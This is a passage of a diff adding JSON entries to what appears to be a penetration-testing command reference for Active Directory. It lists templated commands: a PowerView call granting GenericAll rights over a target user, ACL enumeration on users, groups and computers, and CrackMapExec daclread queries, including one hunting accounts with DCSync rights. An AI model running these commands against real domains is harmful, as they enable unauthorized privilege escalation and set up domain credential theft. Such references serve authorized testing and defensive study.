+            "command": "Add-DomainObjectAcl -TargetIdentity {TARGET_USER} -Rights 'GenericAll' -PrincipalIdentity {USER}",
+            "description": "Grant yourself privileges over a user object."
+          }
+        ]
+      },
+      {
+        "name": "ACL Discovery Modules",
+        "commands": [
+          {
+            "title": "List ACLs on Users",
+            "command": "Get-DomainUser | Get-DomainObjectAcl",
+            "description": "Enumerate ACLs on all domain users."
+          },
+          {
+            "title": "List ACLs on Groups",
+            "command": "Get-DomainGroup | Get-DomainObjectAcl",
+            "description": "Enumerate ACLs on all domain groups."
+          },
+          {
+            "title": "Find Delegation Rights via ACLs",
+            "command": "Get-DomainComputer | Get-DomainObjectAcl | Where-Object {$_.ActiveDirectoryRights -match 'GenericAll'}",
+            "description": "Identify computers with delegation rights via ACLs."
+          }
+        ]
+      },
+      {
+        "name": "CME DACL Enumeration",
+        "commands": [
+          {
+            "title": "DACL Read for User",
+            "command": "cme ldap {DC} -u {USER} -p {PASSWORD} -M daclread -o TARGET={TARGET_USER} ACTION=read",
+            "description": "Read all ACEs for a target user using CME."
+          },
+          {
+            "title": "DACL Read for All Domain",
+            "command": "cme ldap {DC} -u {USER} -p {PASSWORD} -M daclread -o ALL=true",
+            "description": "Enumerate all objects in the domain for DACL permissions using CME."
+          },
+          {
+            "title": "DACL Read with DCSync Rights",
+            "command": "cme ldap {DC} -u {USER} -p {PASSWORD} -M daclread -o RIGHTS=DCSync TARGET_DN={TARGET_USER}",
+            "description": "Read ACLs specifically to identify accounts with DCSync privileges."
+          }
+        ]
+      }
+    ]
+  }
+]
